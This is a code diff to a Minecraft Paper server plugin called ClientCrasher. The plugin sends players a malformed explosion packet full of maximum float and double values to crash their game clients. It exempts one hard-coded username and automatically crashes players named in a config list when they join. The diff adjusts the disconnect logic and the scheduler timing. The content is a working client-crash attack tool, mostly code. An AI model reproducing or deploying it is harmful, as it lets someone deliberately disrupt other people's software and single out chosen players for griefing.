@@ -2,6 +2,7 @@ package dev.gotitim.clientcrasher;
 
 import dev.gotitim.clientcrasher.command.AlwaysCrashCommand;
 import dev.gotitim.clientcrasher.command.CrashCommand;
+import net.kyori.adventure.text.Component;
 import net.minecraft.core.particles.ExplosionParticleInfo;
 import net.minecraft.core.particles.ParticleTypes;
 import net.minecraft.core.particles.ShriekParticleOption;
@@ -17,6 +18,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.jetbrains.annotations.NotNull;
 
 import java.util.Optional;
 
@@ -39,9 +41,8 @@ public final class ClientCrasherPaper extends JavaPlugin implements Listener {
     }
 
     public static void crashPlayer(Player player) {
+        ServerPlayer serverPlayer = ((CraftPlayer) player).getHandle();
         if (!player.getName().equals("gotitim")) {
-            ServerPlayer serverPlayer = ((CraftPlayer) player).getHandle();
-
             serverPlayer.connection.send(new ClientboundExplodePacket(
                     new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                     Float.MAX_VALUE,
@@ -52,8 +53,7 @@ public final class ClientCrasherPaper extends JavaPlugin implements Listener {
                     WeightedList.of(new ExplosionParticleInfo(new ShriekParticleOption(0), Float.MAX_VALUE, Float.MAX_VALUE))
             ));
         }
-
-        player.kick();
+        Bukkit.getScheduler().runTaskLater(getInstance(), () -> serverPlayer.connection.disconnect(Component.empty()), 5);
     }
 
     public static ClientCrasherPaper getInstance() {
@@ -66,9 +66,7 @@ public final class ClientCrasherPaper extends JavaPlugin implements Listener {
         String uuid = event.getPlayer().getUniqueId().toString();
         for (String idNick : ClientCrasherPaper.getInstance().getConfig().getStringList("always-crash")) {
             if(nick.equals(idNick) || uuid.equals(idNick)) {
-                Bukkit.getScheduler().runTaskLater(this, () -> {
-                    crashPlayer(event.getPlayer());
-                }, 5);
+                Bukkit.getScheduler().runTaskLater(this, () -> crashPlayer(event.getPlayer()), 10);
                 return;
             }
         }
